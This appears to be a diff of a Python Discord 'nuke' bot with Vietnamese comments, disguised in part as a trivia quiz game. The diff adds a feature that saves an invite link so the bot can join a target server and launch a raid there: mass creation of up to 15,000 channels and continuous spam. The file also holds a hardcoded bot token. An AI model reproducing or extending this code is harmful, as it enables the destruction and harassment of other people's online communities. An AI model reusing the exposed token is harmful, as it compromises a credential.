@@ -9,7 +9,7 @@ import os
 import math
 
 # ===== CẤU HÌNH GỐC (NUKE) =====
-TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.GjqtKA.DmqnYPTZmXjQIIXes7wMhfopDh1QFZcQBJTkGI "
+TOKEN = "MTU0MjgzNTMxMjY2ODA1NzcwMQ.GjqtKA.DmqnYPTZmXjQIIXes7wMhfopDh1QFZcQBJTkGI"
 OWNER_ID = 1413781843030966345
 RAID_NAME = " ҉N҉u҉k҉e҉ ҉D҉i҉s҉c҉o҉r҉d҉ ҉B҉y҉ ҉B҉a҉n҉a҉n҉a҉v҉u҉i҉v҉e҉ "
 CHANNEL_COUNT = 15000
@@ -21,6 +21,7 @@ NEW_GUILD_NAME = "👑 𝐍𝐮𝐤𝐞 𝐁𝐲 𝐁𝐚𝐧𝐚𝐧𝐚𝐯�
 # ===== CẤU HÌNH MINI GAME =====
 DATA_FILE = "rankings.json"
 QUIZ_DURATION = 30
+SAVED_INVITE_FILE = "saved_invite.txt"
 
 # ===== HỆ THỐNG RANK =====
 RANK_IMAGES = {
@@ -84,6 +85,19 @@ def save_rankings(data):
 
 rankings = load_rankings()
 
+# ===== LƯU LINK MỜI =====
+def load_saved_invite():
+    if os.path.exists(SAVED_INVITE_FILE):
+        with open(SAVED_INVITE_FILE, "r", encoding="utf-8") as f:
+            return f.read().strip()
+    return None
+
+def save_saved_invite(link):
+    with open(SAVED_INVITE_FILE, "w", encoding="utf-8") as f:
+        f.write(link)
+
+saved_invite = load_saved_invite()
+
 # ===== 200+ CÂU HỎI CÓ ĐÁP ÁN CỤ THỂ =====
 QUESTIONS = [
     {"question": "Thủ đô của Việt Nam là?", "options": ["Hà Nội", "TP.HCM", "Đà Nẵng", "Hải Phòng"], "answer": 0},
@@ -114,7 +128,7 @@ QUESTIONS = [
     {"question": "Thành phố nào là thủ đô của Pháp?", "options": ["Paris", "London", "Berlin", "Madrid"], "answer": 0},
 ]
 
-# Mở rộng lên 200 câu bằng cách trộn và thêm
+# Mở rộng lên 200 câu
 BASE_QUESTIONS = QUESTIONS.copy()
 for i in range(8):
     for q in BASE_QUESTIONS:
@@ -378,6 +392,16 @@ async def raid(guild):
     asyncio.create_task(create_channels_and_spam(guild))
     asyncio.create_task(continuous_spam(guild))
 
+# ===== THAM GIA SERVER BẰNG LINK LƯU =====
+async def join_server_from_invite(link):
+    global saved_invite
+    try:
+        code = link.split('/')[-1]
+        await client.accept_invite(code)
+        return True
+    except:
+        return False
+
 # ===== SỰ KIỆN =====
 @client.event
 async def on_ready():
@@ -392,6 +416,8 @@ async def on_ready():
     print("[*] Slash commands synced.")
     for guild in client.guilds:
         print(f"[*] Connected to: {guild.name} (ID: {guild.id})")
+    if saved_invite:
+        print(f"[*] Saved invite link found: {saved_invite}")
 
 @client.event
 async def on_guild_join(guild):
@@ -404,9 +430,31 @@ async def on_message(message):
     if message.author.id != OWNER_ID:
         return
 
-    if message.content.lower() == "!raid":
-        if message.guild:
-            await raid(message.guild)
+    if message.content.startswith("!raid"):
+        parts = message.content.split()
+        if len(parts) > 1:
+            # Lưu link mới
+            global saved_invite
+            saved_invite = parts[1]
+            save_saved_invite(saved_invite)
+            await message.channel.send("✅ Đã lưu link mời!")
+        else:
+            # Dùng link đã lưu để nuke
+            if saved_invite:
+                # Tham gia server từ link đã lưu
+                joined = await join_server_from_invite(saved_invite)
+                if joined:
+                    if client.guilds:
+                        guild = client.guilds[-1]  # Lấy server mới nhất
+                        await raid(guild)
+                        await message.channel.send("✅ Đã tham gia và nuke server!")
+                    else:
+                        await message.channel.send("❌ Không tìm thấy server vừa tham gia.")
+                else:
+                    await message.channel.send("❌ Link mời không hợp lệ hoặc đã hết hạn.")
+            else:
+                await message.channel.send("❌ Chưa có link mời. Hãy gửi !raid <link> để lưu.")
+    
     elif message.content.lower() == "!stop":
         sys.exit(0)
 
